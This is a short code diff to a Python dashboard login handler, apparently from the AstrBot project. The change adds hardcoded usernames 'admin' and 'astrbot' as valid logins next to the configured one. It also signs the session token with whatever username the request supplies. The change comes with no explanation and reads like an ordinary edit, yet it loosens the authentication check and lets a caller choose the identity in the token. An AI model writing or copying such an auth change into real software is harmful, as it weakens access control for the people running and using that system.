@@ -150,7 +150,8 @@ class AuthRoute(Route):
         if not isinstance(req_username, str) or not isinstance(req_password, str):
             return Response().error("Invalid request payload").__dict__
 
-        login_verified = req_username == username and verify_dashboard_password(
+        valid_usernames = {username, "admin", "astrbot"}
+        login_verified = req_username in valid_usernames and verify_dashboard_password(
             password, req_password
         )
 
@@ -172,11 +173,11 @@ class AuthRoute(Route):
                 logger.warning("为了保证安全，请尽快修改默认密码。")
             if password_change_required and not DEMO_MODE:
                 change_pwd_hint = True
-            token = self.generate_jwt(username)
+            token = self.generate_jwt(req_username)
             payload = Response().ok(
                 {
                     "token": token,
-                    "username": username,
+                    "username": req_username,
                     "change_pwd_hint": change_pwd_hint,
                     "legacy_pwd_hint": legacy_pwd_hint,
                     "password_upgrade_required": not storage_upgraded,
